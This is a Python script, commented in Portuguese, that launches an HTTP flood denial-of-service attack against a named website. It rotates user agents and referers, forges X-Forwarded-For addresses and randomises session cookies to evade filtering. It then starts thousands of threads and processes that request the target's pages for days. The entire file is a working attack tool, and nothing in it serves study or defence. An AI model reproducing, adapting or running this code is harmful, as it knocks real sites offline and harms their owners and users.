import requests
import threading
import multiprocessing
import random
import time
import string
import socket

# Lista de user agents e referers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.141 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.151 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.161 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.171 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.181 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.191 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.201 Safari/537.36",
]

referers = [
    "http://www.wikipedia.org",
    "http://www.reddit.com",
    "http://www.amazon.com",
    "http://www.facebook.com",
    "http://www.twitter.com",
    "http://www.youtube.com"
    "http://www.google.com",
    "http://www.bing.com"
    "http://www.duckduckgo.com",
    "http://www.yahoo.com",
    "http://www.youtube.com",
    "http://www.facebook.com",
    "http://www.amazon.com",
    "http://www.wikipedia.org",
    "http://www.twitter.com",
    "http://www.instagram.com",
    "http://www.linkedin.com",
    "http://www.reddit.com",
    "http://www.netflix.com",
    "http://www.microsoft.com",
    "http://www.apple.com",
    "http://www.stackoverflow.com",
    "http://www.github.com",
    "http://www.twitch.tv",
    "http://www.spotify.com",
    "http://www.ebay.com",
    "http://www.pinterest.com",
]

# Função para gerar um IP spoofed aleatório
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função de geração de cookie aleatório
def generate_random_cookie(length=20):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Função de ataque com IP spoofed randomizado
def flood(target_url, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "Referer": referer,
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1"
            }
            # Adiciona cabeçalhos extras de ofuscação
            headers["X-Requested-With"] = "XMLHttpRequest"
            headers["Origin"] = "http://example.com"
            headers["DNT"] = "1"
            headers["X-Forwarded-For"] = generate_random_ip()

            # Autenticação de cookies
            cookies = {
                "sessionid": generate_random_cookie()
            }

            # Simulação de comportamento de usuário
            session = requests.Session()
            session.headers = headers
            session.cookies.update(cookies)

            # Acessa páginas adicionais no site alvo
            page = random.choice(["page1", "page2", "page3"])
            url = f"{target_url}/{page}"
            response = session.get(url)
            print(f"Request sent to {url}, Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Configurações do ataque
target_url = "https://agrcbt.pt/"
duration = 700013
num_threads = 8024
num_processes = 6024

# Inicia os threads e processos
threads = []
processes = []
for _ in range(num_threads):
    thread = threading.Thread(target=flood, args=(target_url, duration))
    threads.append(thread)
    thread.start()

for _ in range(num_processes):
    process = multiprocessing.Process(target=flood, args=(target_url, duration))
    processes.append(process)
    process.start()

# Aguarda os threads e processos terminarem
for thread in threads:
    thread.join()

for process in processes:
    process.join()